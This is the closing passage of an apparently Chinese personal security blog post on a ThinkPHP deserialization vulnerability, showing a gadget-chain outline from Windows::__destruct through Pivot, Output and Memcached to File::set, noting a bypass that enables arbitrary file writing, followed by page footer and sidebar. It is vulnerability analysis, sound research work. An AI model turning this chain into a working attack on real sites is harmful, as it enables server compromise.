+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Windows::__destruct</span><br><span class="line">--&gt;Windows::removeFiles</span><br><span class="line">--&gt;file_exists(将类当作字符串触发__toString)</span><br><span class="line">--&gt;Pivot::__toString(方法继承于Model类,和下面的toJson和toArray一样)</span><br><span class="line">--&gt;Pivot::toJson--&gt;Pivot::toArray</span><br><span class="line">通过一系列手段使得$value成为Output类然后调用Output::getAttr(Output类没有getAttr方法触发__call)</span><br><span class="line">--&gt;Output::__call</span><br><span class="line">--&gt;Output::block--&gt;Output::writeln--&gt;Output::write</span><br><span class="line">--&gt;Memcached::write</span><br><span class="line">--&gt;Memcached::set(cache目录下的set)</span><br><span class="line">--&gt;File::set</span><br><span class="line">--&gt;Memcached::set(cache目录下的set)</span><br><span class="line">--&gt;File::set(绕过死亡杂糅写入文件)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/thinkphp%E6%BC%8F%E6%B4%9E/" rel="tag"># thinkphp漏洞</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/17/thinkphp-5.1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="thinkphp-5.1.*-反序列化漏洞">
+      <i class="fa fa-chevron-left"></i> thinkphp-5.1.*-反序列化漏洞
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">漏洞环境:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">另一种思路:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">漏洞总结:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LtmThink</p>
+  <div class="site-description" itemprop="description">LtmThink的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zls1793" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zls1793" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ltmthink1793@gmail.com" title="E-Mail → mailto:ltmthink1793@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LtmThink</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
